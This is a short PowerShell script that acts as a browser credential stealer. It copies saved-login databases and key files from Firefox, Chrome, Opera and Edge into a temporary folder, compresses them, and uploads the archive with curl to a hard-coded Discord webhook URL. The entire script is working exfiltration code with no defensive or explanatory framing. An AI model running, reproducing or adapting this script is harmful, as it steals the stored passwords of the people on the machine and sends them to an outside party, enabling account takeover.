$exfil_folder = "$env:temp\B1555.005"
if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "B1555.005" -ItemType "directory" -force}
$FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\B1555.005Firefox_key4.db"} else {}
if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\B1555.005Firefox_logins.json"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\B1555.005Chrome_Login Data"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Local State" -destination "$exfil_folder\B1555.005Chrome_Local State"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\B1555.005Chrome_Login Data For Account"} else {}
if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\B1555.005Opera_Login Data"} else {}
if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\B1555.005Edge_Login Data"} else {} 
compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force

$webhookUrl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"  # Replace with your Discord webhook URL

curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $webhookUrl
